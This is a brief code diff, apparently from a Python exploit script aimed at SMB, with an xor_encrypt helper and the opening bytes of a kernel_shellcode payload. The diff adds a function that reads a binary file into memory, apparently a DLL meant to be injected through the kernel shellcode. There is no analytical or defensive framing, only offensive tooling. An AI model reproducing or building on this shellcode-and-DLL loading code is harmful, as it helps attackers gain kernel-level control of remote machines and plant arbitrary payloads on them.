@@ -111,6 +111,14 @@ def disconnect_tree(self, tid):
 def xor_encrypt(message, key):
 	return ''.join(chr(ord(c) ^ ord(k)) for c, k in izip(message, cycle(key)))
 
+def read_dll_file_as_hex():
+    print("reading DLL into memory!")
+    with open("file.bin", "rb") as f:
+        data = f.read()
+        hex = binascii.hexlify(data)
+        print("file imported into memory!")
+        print('File size: {:d}'.format(len(data)))
+    return data
 
 kernel_shellcode = b"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
 kernel_shellcode += b"\xFF\x89\x53\x04\x89\x03\x48\x8D\x05\x0A\x00\x00\x00\x48\x89\xC2"
